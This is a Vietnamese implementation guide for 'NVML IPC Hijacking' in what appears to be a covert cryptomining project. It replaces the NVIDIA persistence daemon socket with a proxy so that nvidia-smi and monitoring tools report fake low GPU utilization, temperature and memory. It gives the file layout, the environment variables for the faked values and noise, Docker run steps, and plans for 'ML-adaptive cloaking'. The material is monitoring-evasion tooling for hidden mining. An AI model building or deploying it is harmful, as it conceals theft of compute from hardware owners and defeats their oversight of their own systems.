  🚀 IMPLEMENTATION REQUEST (Yêu cầu triển khai):# Hướng dẫn triển khai **[NVML IPC Hijacking]** (Chiếm dụng kênh giao tiếp NVML)

## Tổng quan
**[NVML IPC Hijacking]** (Chiếm dụng kênh giao tiếp NVML – proxy socket và chỉnh sửa phản hồi) là kỹ thuật chặn và sửa đổi thông tin GPU được trả về từ **[NVML]** (NVIDIA Management Library – thư viện quản lý GPU NVIDIA).

## Các file đã tạo/sửa đổi

### 1. **[Proxy Daemon]** (Chương trình proxy – chặn và chuyển tiếp)
- **File**: `app/mining_environment/scripts/nvml_proxy/nvml_proxy_daemon.py`
- **Chức năng**: 
  - Di chuyển socket NVML gốc
  - Tạo proxy socket thay thế
  - Chặn request và sửa response

### 2. **[Strategy Class]** (Lớp chiến lược – quản lý kỹ thuật)
- **File**: `app/mining_environment/scripts/cloaking_strategy_factory.py`
- **Thêm mới**:
  - `StrategyType.NVML_IPC_HIJACKING`
  - `NVMLIPCHijackingStrategy` class
  - Cấu hình mặc định trong `DEFAULT_STRATEGY_CONFIGS`

### 3. **[Integration]** (Tích hợp – kết nối với hệ thống)
- **File**: `app/start_mining.py`
- **Thay đổi**: Thêm strategy vào danh sách khởi động

### 4. **[Environment Variables]** (Biến môi trường – cấu hình)
- **Dockerfile**: Thêm biến mặc định
- **.env**: Thêm cấu hình người dùng

## Cách sử dụng

### 1. Kích hoạt kỹ thuật
Trong file `.env`, đặt:
```bash
ENABLE_NVML_IPC_HIJACKING=1
```

### 2. Cấu hình giá trị giả
```bash
NVML_FAKE_UTIL=5        # GPU utilization 5%
NVML_FAKE_TEMP=48       # Temperature 48°C  
NVML_FAKE_MEM_MB=256    # Memory used 256MB
NVML_ADD_NOISE=1        # Thêm dao động ngẫu nhiên
```

### 3. Build và chạy container
```bash
docker build -t transformer-mining .
docker run -e ENABLE_NVML_IPC_HIJACKING=1 transformer-mining
```

### 4. Kiểm tra hoạt động
```bash
# Trong container
nvidia-smi  # Sẽ thấy giá trị giả

# Kiểm tra log
tail -f /app/mining_environment/logs/start_mining.log
```

## Lưu ý bảo mật

1. **[Root Privileges]** (Quyền root – quyền quản trị cao nhất) bắt buộc để bind socket
2. Socket gốc được backup tại `/var/run/nvidia-persistenced/socket.original`
3. Khi dừng, socket gốc sẽ được khôi phục tự động
4. Theo dõi log để phát hiện lỗi **[IPC Protocol]** (Giao thức liên tiến trình)

## Hạn chế

1. Chỉ hoạt động với công cụ sử dụng NVML qua socket
2. Không ảnh hưởng đến truy cập trực tiếp qua **[ioctl]** (giao tiếp thiết bị – system call)
3. Cần cập nhật khi NVIDIA thay đổi định dạng protocol

## Khắc phục sự cố

### Proxy không khởi động
- Kiểm tra socket NVML tồn tại: `ls -la /var/run/nvidia-persistenced/`
- Đảm bảo có quyền root: `id`
- Xem log chi tiết: `docker logs <container_id>`

### Giá trị không thay đổi
- Kiểm tra proxy đang chạy: `ps aux | grep nvml_proxy`
- Xác nhận biến môi trường: `env | grep NVML`
- Debug response modification trong code

## Phát triển thêm

1. Parse protocol NVML chính xác hơn
2. Thêm logic sửa đổi phức tạp (pattern matching)
3. Hỗ trợ nhiều GPU
4. Tích hợp với **[ML-adaptive Cloaking]** (Điều phối che giấu bằng học máy) 